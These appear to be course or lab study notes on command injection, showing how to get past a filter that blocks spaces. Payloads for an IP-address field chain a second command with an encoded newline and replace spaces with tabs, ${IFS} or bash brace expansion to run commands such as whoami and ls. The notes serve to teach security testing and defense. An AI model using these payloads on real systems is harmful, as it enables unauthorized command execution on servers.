# **Command Injection – Bypassing Space Filters 

## **1. Concept**

- Multiple:
    
    - Detection methods
        
    - Bypass techniques

    - **Linux environment**
        

---

## **2. Bypass Blacklisted Operators**

- Most operators are **blacklisted**
    
- **New-line (`\n`)**:
    
    - Usually **not blacklisted**
        
    - Can be used for injection
        

---

### **Test Payload**

```id="k2o4i9"
127.0.0.1%0a
```

### **Result**

- Request accepted
    
- Ping output returned
    
- New-line is **not blocked**
    

---

## **3. Bypass Blacklisted Spaces**

### **Payload**

```id="k7p8z3"
127.0.0.1%0a whoami
```

### **Result**

- **Invalid input** error
    

---

### **Test Space Only**

```id="p1x9lm"
127.0.0.1%0a 
```

### **Result**

- Still **blocked**
    

---

### **Conclusion**

- **Space character is blacklisted**
    

---

## **4. Using Tabs**

### **Method**

- Replace space with **tab**
    

### **Encoded Tab**

```id="j4v2qs"
%09
```

---

### **Payload**

```id="z8w1df"
127.0.0.1%0a%09
```

---

### **Result**

- Request accepted
    
- Space filter bypassed
    

---

## **5. Using `$IFS`**

### **Concept**

- `$IFS` = **space + tab (default)**
    
- Can replace space
    

---

### **Payload**

```id="m6y8bn"
127.0.0.1%0a${IFS}
```

---

### **Result**

- Request accepted
    
- Space filter bypassed
    

---

## **6. Using Brace Expansion**

### **Concept**

- Bash adds spaces automatically
    

---

### **Example**

```bash
{ls,-la}
```

---

### **Result**

- Command executes without spaces
    

---

### **Injection Payload**

```id="g3p7vn"
127.0.0.1%0a{ls,-la}
```
